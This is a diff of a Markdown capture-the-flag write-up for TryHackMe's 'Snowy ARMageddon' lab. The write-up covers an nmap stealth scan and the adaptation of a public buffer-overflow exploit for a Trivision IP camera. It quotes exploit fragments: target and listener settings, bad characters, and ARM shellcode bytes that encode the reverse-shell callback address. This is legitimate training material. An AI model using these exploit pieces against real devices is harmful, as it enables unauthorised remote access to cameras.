@@ -45,12 +45,12 @@ This room was included as one of the sidequests for the TryHackMe Advent of Cybe
 
 Start with a `nmap` scan with the `-sS` switch and go have a coffee while it runs.
 The `-sS` switch asks `nmap` to perform a `SYN Stealth scan` which is a relatively stealthy (remember that we are told that stealth is important in this challenge) and quick scan.  A `SYN Stealth scan` never opens a full TCP connection and instead relies on sending  `SYN` packets and waiting for a `SYN/ACK` or `RST` responses.
-```
-sudo nmap -sS -p1-65335 10.10.106.239
+```console
+# sudo nmap -sS -p1-65335 10.10.106.239
 ```
 **_NOTE:_** You may also use `rustscan -a 10.10.106.239` which yields _MUCH_ quicker portscan results - but honestly I don't know how it compares to NMAP with -sS in terms of 'noisieness'.
 
-```
+```console
 Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-15 09:02 GMT
 Nmap scan report for ip-10-10-200-123.eu-west-1.compute.internal (10.10.106.239)
 Host is up (0.00029s latency).
@@ -90,7 +90,7 @@ Some Google searching for `Trivision NC-227WF Exploit` quickly leads us to the f
 The article explains how a buffer overflow vulnerability in the Trivision camera firmware can be exploited to establish a reverse shell connection.  It conveniently also provides [assembly code instructions](code/Snowy_ARMageddon/original_assembly_instructions.asm) and a [python script](code/Snowy_ARMageddon/original_exploit.py) to exploit this.
 
 The Python code includes the `HOST`, `LHOST` variables that need to be updated with the Camera IP address and Localhost IP address respectively. 
-```
+```python
 HOST = '10.10.106.239'
 PORT = 50628
 LHOST = [10,10,52,204]
@@ -98,20 +98,20 @@ LPORT = 4444
 ```
 
 The code then declares a variable called `BADCHARS` - this contains a set of hex values that we cannot pass on to the device.... these will come into play in a short while...
-```
+```python
 BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'  # Equivalent to decimal values: 0, 9, 10, 13, 32, 35 and 38 
 ```
 
 There is also a line towards the end of the script that needs to be updated with the IP Camera's address:
-```
+```python
 s = remote('10.10.106.239', 50628)
 ```
 
 Now comes the interesting bit...  The Python script includes a block of code that passes assembly instructions in the form of hex byte strings.  This includes our machine's local IP address hard-coded into the hex byte strings which will be used to establish the reverse shell.  Luckily for us, the inline documentation conviently indicates which line is tackling this and we also have the assembly code corresponding to it:
-```
+```python
 SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
 ```
-```
+```assembly
 /* ADDR */
 mov r1, #0x164
 lsl r1, #8
